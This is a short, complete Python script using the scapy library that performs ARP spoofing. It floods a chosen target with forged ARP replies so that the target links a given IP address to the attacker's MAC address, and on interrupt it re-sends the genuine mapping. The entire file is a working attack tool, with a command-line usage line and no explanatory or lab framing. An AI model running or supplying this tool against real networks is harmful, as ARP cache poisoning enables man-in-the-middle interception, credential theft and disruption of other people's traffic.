#!/usr/bin/env python3

from sys import argv
from time import sleep
from scapy.all import *

def arpspoof(iface, target, spoof_ip):
    """
    arpspoof(iface, target, spoof_ip)

    use arpspoof the target.
    iface: network interface name.
    target: spoof target IP.
    spoof_ip: spoof IP in target arp cache.
    """
    try:
        deceiver_mac = get_if_hwaddr(iface)
        target_mac = getmacbyip(target)

        if not target_mac:
            print("Please enter the correct target!")
            exit()

        while True:
            sendp( \
                Ether(dst=target_mac) / \
                ARP(op=2, pdst=target, hwdst=target_mac, \
                    psrc=spoof_ip, hwsrc=deceiver_mac), \
                verbose=False \
            )
            print("arp reply {} is-at {}".format(spoof_ip, deceiver_mac))
            sleep(2)
    
    except KeyboardInterrupt:
        print("Cleaning up and re-arping targets...")
        spoof_mac = getmacbyip(spoof_ip)

        if not spoof_mac:
            exit()

        for i in range(5):
            sendp( \
                Ether(dst=target_mac) / \
                ARP(op=2, pdst=target, hwdst=target_mac, \
                    psrc=spoof_ip, hwsrc=spoof_mac), \
                verbose=False \
            )
            print("arp reply {} is-at {}".format(spoof_ip, spoof_mac))
            sleep(2)


if __name__ == '__main__':
    try:
        arpspoof(argv[1], argv[2], argv[3])
    except IndexError:
        print("Usage: arpspoof.py <interface> <target> <spoof>")

